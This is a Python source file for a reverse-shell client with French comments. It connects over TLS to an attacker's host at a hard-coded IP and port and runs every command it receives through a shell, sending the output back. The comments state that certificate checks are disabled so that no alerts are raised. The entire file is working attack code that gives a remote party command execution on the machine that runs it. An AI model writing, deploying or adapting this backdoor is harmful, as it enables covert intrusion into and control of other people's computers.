# client_revershell
# Version 0.3
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des librairies suivantes :
# socket = communication entre l'attaquant et la cible
# ssl = chiffrement des échanges
# subprocess = exécution des commandes
# os = manipulation des commandes de l'OS
import socket
import ssl
import subprocess
import os

# /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
HOST = '192.168.1.6'
PORT = 25566

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Wrap the socket in an SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
# certificat autosigné : désactivation des vérifications
# pour ne pas déclenché d'alerte
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

wrappedSocket = context.wrap_socket(sock, server_hostname=HOST)
wrappedSocket.connect((HOST, PORT))

try:
   while True:
        received_data = wrappedSocket.recv(1024)
        # Send the output of the command over the SSL connection
        # Execute a system command

        cmd = received_data.decode().split()
        print(cmd)
        #received_data = 0
        # la commande a-t-elle des paramètres ?
        if len(cmd) >= 2:
            if cmd[0] == "cd" or cmd[0] == "CD":
                os.chdir(cmd[1])
                # à supprimer (debug)
                output = "Changed directory to {}".format(cmd[1])
                wrappedSocket.sendall(output.encode())
            elif cmd[0] == "cp" or cmd[0] == "CP":
                print(cmd)
            elif cmd[0] == "q" or cmd[0] == "quit" or cmd[0] == "exit":
                wrappedSocket.shutdown(socket.SHUT_RDWR)
                wrappedSocket.close()
                exit(0)
            else:
                command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
                output, err = command.communicate(timeout=60)
                if not err:
                    wrappedSocket.sendall(output)
                elif not output:
                    wrappedSocket.sendall(err)
                else:
                    wrappedSocket.sendall("err")
        else:
            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
            output, err = command.communicate()
            if not err:
                wrappedSocket.sendall(output)
            else:
                wrappedSocket.sendall(err)
except Exception:
    exit(-1)
finally:
    wrappedSocket.shutdown(socket.SHUT_RDWR)
    wrappedSocket.close()
    exit(0)